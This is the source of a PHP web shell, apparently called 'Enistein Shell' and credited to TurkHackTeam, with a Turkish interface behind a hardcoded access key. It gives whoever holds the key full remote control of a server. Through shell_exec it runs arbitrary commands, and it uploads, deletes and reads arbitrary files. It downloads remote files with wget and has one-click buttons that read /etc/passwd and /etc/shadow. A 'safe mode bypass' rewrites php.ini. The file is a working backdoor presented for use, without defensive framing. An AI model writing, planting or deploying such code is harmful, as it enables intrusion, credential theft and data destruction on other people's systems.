<?php
if (!isset($_GET["yetkili"]) || $_GET["yetkili"] !== "enistein") {
    die("Error");
}
?>
<?php 
$uname = php_uname();
$version = phpversion();
$working_directory = getcwd();
if(isset($_GET['dir'])) {
  $dir = $_GET['dir'];
}
else{
  $dir = __DIR__; // Dizinin yolu
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Enistein</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.7/dist/tailwind.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.5/dist/sweetalert2.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.5/dist/sweetalert2.all.min.js"></script>

  </head>
  <body>
    <div class="container mx-auto mt-10">
      <div class="flex items-center mb-4">
        <div class="w-1/3 text-left pr-4">
          <p class="text-lg">uname : <a class ="text-green-600"> <?php echo $uname; ?> </a></p>
          <p class="text-lg text-lime-500">yazılım:<a class ="text-green-600">  <?php echo $_SERVER['SERVER_SOFTWARE'];?></a></p>
          <p class="text-lg text-lime-500">php sürümü: <a class ="text-green-600">  <?php echo $version; ?></a></p>
          <p class="text-lg text-red-900">Dizin: <br>
<?php
$folders = explode('/', $dir); // Klasörleri ayır
$current_folder = '';
foreach ($folders as $folder) {
  if (!empty($folder)) { // Boş değilse
    $current_folder .= '/' . $folder;
    echo '<a href="?yetkili=enistein&dir=' . $current_folder . '">' . $folder . '</a>/';
  }
}
?>
</p>
        </div>
        <div class="w-1/3 text-center">
          <a href="https://twitter.com/_enistein" target="_blank" class="text-6xl font-bold">Enistein</a>
          <p class="text-2xl font-bold">Shell</p>
          <a href="https://turkhackteam.org" target="_blank"  class="text-2xl font-bold text-red-500">TurkHackTeam.org</a>
        </div>
        <div class="w-1/3 text-left pl-4">
          <p class="text-lg">IP Adresi: <?php echo $_SERVER['SERVER_ADDR'];?> </p>
          <?php
            if(isset($_FILES['dosya'])) {
                $hedef_klasor = $dir . '/'; // dosyaların yükleneceği klasör
                $hedef_dosya = $hedef_klasor . basename($_FILES["dosya"]["name"]); // yüklenen dosyanın hedef klasöre ve dosya adına göre konumu
                $yukleme_sonucu = move_uploaded_file($_FILES["dosya"]["tmp_name"], $hedef_dosya); // dosyanın yüklenmesi
                if($yukleme_sonucu) {
                    header("Location: ");
                    echo "Dosya başarıyla yüklendi.";
                } else {
                    echo "Dosya yüklenirken bir hata oluştu.";
                }
            }
            ?>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="dosya" class="mt-4">
                <button type="submit" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded mt-4">Yükle</button>
            </form>
            <div class="relative inline-block text-left">
            <button type="button" class="inline-flex justify-center w-full rounded-md border border-gray-300 shadow-sm px-4 py-2 bg-red-500 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500" id="menu-button" aria-expanded="false" aria-haspopup="true" onclick="toggleMenu()">
              İşlemler
              <svg class="ml-2 -mr-0.5 h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                <path fill-rule="evenodd" d="M10 14l-5-5h3V6h4v3h3l-5 5z" clip-rule="evenodd" />
              </svg>
            </button>

            <div class="hidden origin-top-right absolute right-0 mt-2 w-56 rounded-md shadow-lg bg-white ring-1 ring-black ring-opacity-5" id="menu">
              <div class="py-1" role="menu" aria-orientation="vertical" aria-labelledby="menu-button" tabindex="-1">
                <a type="button" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 hover:text-gray-900" onclick="SendCommand()" role="menuitem">Komut Çalıştır</a>
                <a type="button" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 hover:text-gray-900" onclick="DownloadFromUrl()" role="menuitem">Dosya İndir</a>
                <a href="?yetkili=enistein&safemode=true" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 hover:text-gray-900" role="menuitem">Safe Mode Bypass</a>

              </div>
            </div>
          </div>
          <div class="relative inline-block text-left">
            <button type="button" class="inline-flex justify-center w-full rounded-md border border-gray-300 shadow-sm px-4 py-2 bg-red-500 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500" id="fast-button" aria-expanded="false" aria-haspopup="true" onclick="fastMenu()">
              Hızlı Komutlar
              <svg class="ml-2 -mr-0.5 h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                <path fill-rule="evenodd" d="M10 14l-5-5h3V6h4v3h3l-5 5z" clip-rule="evenodd" />
              </svg>
            </button>

            <div class="hidden origin-top-right absolute right-0 mt-2 w-56 rounded-md shadow-lg bg-white ring-1 ring-black ring-opacity-5" id="fast">
              <div class="py-1" role="menu" aria-orientation="vertical" aria-labelledby="fast-button" tabindex="-1">
                <a type="button" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 hover:text-gray-900" onclick="FastCommand('passwd')" role="menuitem">passwd</a>
                <a type="button" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 hover:text-gray-900" onclick="FastCommand('shadow')" role="menuitem">shadow</a>
                <a type="button" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 hover:text-gray-900" onclick="FastCommand('whoami')" role="menuitem">whoami</a>

              </div>
            </div>
          </div>

<script>
function toggleMenu() {
  var menu = document.getElementById("menu");
  var button = document.getElementById("menu-button");
  menu.classList.toggle("hidden");
  button.setAttribute("aria-expanded", menu.classList.contains("hidden") ? "false" : "true");
  button.setAttribute("aria-haspopup", "true");
}
function fastMenu() {
  var menu = document.getElementById("fast");
  var button = document.getElementById("fast-button");
  menu.classList.toggle("hidden");
  button.setAttribute("aria-expanded", menu.classList.contains("hidden") ? "false" : "true");
  button.setAttribute("aria-haspopup", "true");
}
</script>

          </div>
          <?php
          if(isset($_GET['safemode'])) {
            $ini_file = php_ini_loaded_file();
            if (!$ini_file) {
                echo "php.ini dosyası bulunamadı!";
            } else {
                $ini_contents = file_get_contents($ini_file); // dosyanın içeriğini oku
                $ini_contents = preg_replace('/safe_mode\s*=\s*On/', 'safe_mode = Off', $ini_contents); // safe_mode ayarını değiştir
                file_put_contents($ini_file, $ini_contents); // dosyayı kaydet
            }
        
          }
    
      ?>
     
      </div>
      <div class="bg-white shadow-md rounded my-6">
        <table class="w-full table-auto">
          <thead>
            <tr class="bg-gray-200 text-gray-600 uppercase text-sm leading-normal">
              <th class="py-3 px-6 text-left">Dosya Adı</th>
              <th class="py-3 px-6 text-left">Boyut</th>
              <th class="py-3 px-6 text-left">Yetki</th>
              <th class="py-3 px-6 text-left">Tarih</th>
              <th class="py-3 px-6 text-left">İşlem</th>
            </tr>
          </thead>
          <tbody class="text-gray-600 text-sm font-light">
          <?php
if(isset($_GET['dir'])) {
  $dir = $_GET['dir'];
}
else{
  $dir = __DIR__; // Dizinin yolu
}

// Dizindeki tüm dosya ve klasörleri al
$files = scandir($dir);

echo '<table class="min-w-full divide-y divide-gray-200">';

foreach ($files as $file) {
  // "." ve ".." dosyalarını atla
  if ($file == '.' || $file == '..') {
    continue;
  }

  // Dosya bilgilerini al
  $path = $dir . '/' . $file;
  $size = filesize($path);
  $perms = fileperms($path);
  $modtime = date("d M Y", filemtime($path));

  // Dosya bilgilerini tabloya ekle
  echo '<tr class="border-b border-gray-200 hover:bg-gray-100';
  if(is_dir($path)){ // eğer dosya klasörse class'a yeni bir stil ekle
    echo ' bg-green-200';
  }
  else{
    echo ' bg-green-500';
  }
  echo '">';
  echo '<td class="py-3 px-6 text-left whitespace-nowrap">';
  if (is_dir($path)) {
    echo '<a href="?yetkili=enistein&dir=' . $path . '">' . $file . '</a>';
  } else {
    echo '<a onclick="getFileContent(\'' . $path . '\')">' . $file . '</a>';

      }
  echo '</td>';  
  echo '<td class="py-3 px-6 text-left whitespace-nowrap">' . $size . ' bytes</td>';
  echo '<td class="py-3 px-6 text-left whitespace-nowrap">' . substr(sprintf('%o', $perms), -4) . '</td>';
  echo '<td class="py-3 px-6 text-left whitespace-nowrap">' . $modtime . '</td>';
  echo '<td class="py-3 px-6 text-left whitespace-nowrap">';
  echo '<a href="' . $file . '" class="text-indigo-600 hover:text-indigo-900" download>İndir</a> /';
  echo '<a onclick="DeleteFile(\'' . $file . '\')"  class="text-red-600 hover:text-red-900">Sil</a>';
  echo '</td>';
  echo '</tr>';
}

echo '</tbody></table>';

if (isset($_GET['download'])) {
  $file = $_GET['download'];

  // Dosya mevcutsa
  if (file_exists($file)) {
    header('Content-Type: text/plain');
    header('Content-Disposition: inline');
    $content = file_get_contents($file);
    echo "<pre id='file-content'>";
    echo htmlspecialchars($content);
    echo "</pre>";
  }
}



// Dosyayı silmek için
if (isset($_POST['delete'])) {
  $file = $_POST['delete'];
  $path = $dir . '/' . $file;

  // Dosyayı sil
  if (unlink($path)) {
    echo '<p id="sildurum">Başarılı</p>';
  } else {
    echo '<p id="sildurum">Başarısız</p>';
  }
}
?>



          </tbody>
        </table>
      </div>
    </div>
    <p id="commandoutput" style="display:none;"><?php
    // sunucu komutları gönderildiyse çalıştırın
    if (isset($_POST["command"])) {
        $output = shell_exec($_POST["command"]);
        echo $output;
        exit;
    }
    ?></p>
  </body>
</html>

        <script>
function SendCommand() {
  Swal.fire({
    title: 'Komut Girin',
    html: '<input id="command-input" class="swal2-input">',
    focusConfirm: false,
    preConfirm: () => {
      const command = document.getElementById('command-input').value.trim();
      if (!command) {
        Swal.showValidationMessage('Lütfen bir komut girin');
      }
      return command;
    }
  }).then(result => {
    if (result.isConfirmed) {
      // Kullanıcı bir komut girdi, XMLHttpRequest kullanarak sunucuya post at
      const xhr = new XMLHttpRequest();
      xhr.open('POST', '');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.onload = function() {
        if (xhr.status === 200) {
          var parser = new DOMParser();
          var doc = parser.parseFromString(xhr.responseText, "text/html");
          var CommandOutput = doc.querySelector("#commandoutput").textContent;
          Swal.fire({
            title: 'Komut Çıktısı',
            html: '<pre><code>' + CommandOutput + '</code></pre>',
            confirmButtonText: 'Tamam',
            footer: '<a href="https://twitter.com/_enistein" target="_blank" >Enistein</a>',
            width: '50%',
            fontSize: '14px',
            showClass: {
              popup: 'animate__animated animate__fadeInDown'
            },
            hideClass: {
              popup: 'animate__animated animate__fadeOutUp'
            },
            background: '#F4F4F4',
            highlight: true
          });
        } else {
          // Sunucudan bir hata döndü, hatayı göster
          Swal.fire({
            icon: 'error',
            title: 'Hata',
            text: 'Sunucudan bir hata döndü: ' + xhr.statusText,
            confirmButtonText: 'Tamam'
          });
        }
      };
      xhr.send('command=' + encodeURIComponent(result.value));
    }
  });
}

function DownloadFromUrl() {
  Swal.fire({
    title: 'Adres',
    html: '<input id="command-input" class="swal2-input">',
    focusConfirm: false,
    preConfirm: () => {
      const command = document.getElementById('command-input').value.trim();
      if (!command) {
        Swal.showValidationMessage('Lütfen bir adres girin');
      }
      return command;
    }
  }).then(result => {
    if (result.isConfirmed) {
      // Kullanıcı bir komut girdi, XMLHttpRequest kullanarak sunucuya post at
      const xhr = new XMLHttpRequest();
      xhr.open('POST', '');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.onload = function() {
        if (xhr.status === 200) {
          var parser = new DOMParser();
          var doc = parser.parseFromString(xhr.responseText, "text/html");
          var CommandOutput = doc.querySelector("#commandoutput").textContent;
          Swal.fire({
            title: 'Komut Çıktısı',
            html: '<pre><code> Başarılı! </code></pre>',
            confirmButtonText: 'Tamam',
            footer: '<a href="https://twitter.com/_enistein" target="_blank" >Enistein</a>',
            width: '50%',
            fontSize: '14px',
            showClass: {
              popup: 'animate__animated animate__fadeInDown'
            },
            hideClass: {
              popup: 'animate__animated animate__fadeOutUp'
            },
            background: '#F4F4F4',
            highlight: true
          });
        } else {
          // Sunucudan bir hata döndü, hatayı göster
          Swal.fire({
            icon: 'error',
            title: 'Hata',
            text: 'Sunucudan bir hata döndü: ' + xhr.statusText,
            confirmButtonText: 'Tamam'
          });
        }
      };
      xhr.send('command=' + encodeURIComponent("wget "+result.value));
    }
  });
}
function FastCommand(command){
  // Kullanıcı bir komut girdi, XMLHttpRequest kullanarak sunucuya post at
  if(command =="passwd"){
    command = "cat /etc/passwd"
  }
  else if(command =="shadow"){
    command = "cat /etc/shadow"
  }
  const xhr = new XMLHttpRequest();
      xhr.open('POST', '');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.onload = function() {
        if (xhr.status === 200) {
          
          var parser = new DOMParser();
          var doc = parser.parseFromString(xhr.responseText, "text/html");
          var CommandOutput = doc.querySelector("#commandoutput").textContent;
          if(CommandOutput == ""){
            CommandOutput = "Yetki Yok"
          }
          Swal.fire({
            title: 'Komut Çıktısı',
            html: '<pre><code>' + CommandOutput + '</code></pre>',
            confirmButtonText: 'Tamam',
            footer: '<a href="https://twitter.com/_enistein" target="_blank" >Enistein</a>',
            width: '50%',
            fontSize: '14px',
            showClass: {
              popup: 'animate__animated animate__fadeInDown'
            },
            hideClass: {
              popup: 'animate__animated animate__fadeOutUp'
            },
            background: '#F4F4F4',
            highlight: true
          });
        } else {
          // Sunucudan bir hata döndü, hatayı göster
          Swal.fire({
            icon: 'error',
            title: 'Hata',
            text: 'Sunucudan bir hata döndü: ' + xhr.statusText,
            confirmButtonText: 'Tamam'
          });
        }
      };
      xhr.send('command=' + encodeURIComponent(command));
}

function getFileContent(file) {
  var url = window.location.href;
  const xhr = new XMLHttpRequest();
  xhr.open('POST', url + '&download=' + encodeURIComponent(file));
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onload = function() {
    if (xhr.status === 200) {
      // Dosya içeriğini al ve göster
      var parser = new DOMParser();
      var doc = parser.parseFromString(xhr.responseText, "text/html");
      var CommandOutput = doc.querySelector("#file-content").textContent;
      if (CommandOutput == "") {
        CommandOutput = "Yetki Yok"
      }
      Swal.fire({
        title: 'Dosya İçeriği',
        html: '<textarea id="file-content-input" style="width: 100%; height: 100%;" rows="10">' + CommandOutput + '</textarea>',
        confirmButtonText: 'Tamam',
        footer: '<a href="https://twitter.com/_enistein" target="_blank">Enistein</a>',
        width: '50%',
        fontSize: '14px',
        showClass: {
          popup: 'animate__animated animate__fadeInDown'
        },
        hideClass: {
          popup: 'animate__animated animate__fadeOutUp'
        },
        background: '#F4F4F4',
        highlight: true,
        didOpen: function() {
          // Dosya içeriğini textarea elementinin içeriğine yazdır
          var fileContentInput = document.querySelector('#file-content-input');
          fileContentInput.innerText = CommandOutput;
        }
      });

    } else {
      // Sunucudan bir hata döndü, hatayı göster
      Swal.fire({
        icon: 'error',
        title: 'Hata',
        text: 'Sunucudan bir hata döndü: ' + xhr.statusText,
        confirmButtonText: 'Tamam'
      });
    }
  };
  xhr.send('download=' + encodeURIComponent(file));
}


function DeleteFile(file){
  const xhr = new XMLHttpRequest();
  xhr.open('POST', '');
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onload = function() {
    if (xhr.status === 200) {
      window.location.reload()
    }
  };
  xhr.send('delete=' + encodeURIComponent(file));
}
</script>
        